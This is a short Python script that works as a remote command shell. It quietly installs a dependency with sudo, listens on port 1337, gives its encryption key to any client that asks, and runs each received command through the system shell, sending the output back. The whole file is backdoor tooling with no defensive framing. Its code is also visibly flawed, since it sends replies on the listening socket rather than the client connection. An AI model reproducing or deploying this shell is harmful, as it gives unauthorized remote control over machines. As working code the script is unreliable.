import os
import sys
import socket
import subprocess

#If cryptography isn't installed, install it.
try:
  from cryptography.fernet import Fernet
except:
  os.system("sudo -H pip install cryptography > /dev/null")
  from cryptography.fernet import Fernet

#Generate key and create cipher_suite
key = Fernet.generate_key()
cipher_suite = Fernet(key)

#Encrypted send function
def sendenc(msg, sckt):
  cipher_text = cipher_suite.encrypt(msg)
  sckt.sendall(cipher_text)
def decrypt(msg):
  return cipher_suite.decrypt(msg)
    
#HOST and PORT and SOCKET:
HOST=''
PORT=1337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()

while 1:
    data = conn.recv(1024)
    if data=="KEY":
      s.sendall(key)
    else:
      data=decrypt(data)
      proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
      stdout_value = proc.stdout.read() + proc.stderr.read()
      sendenc(stdout_value, s)

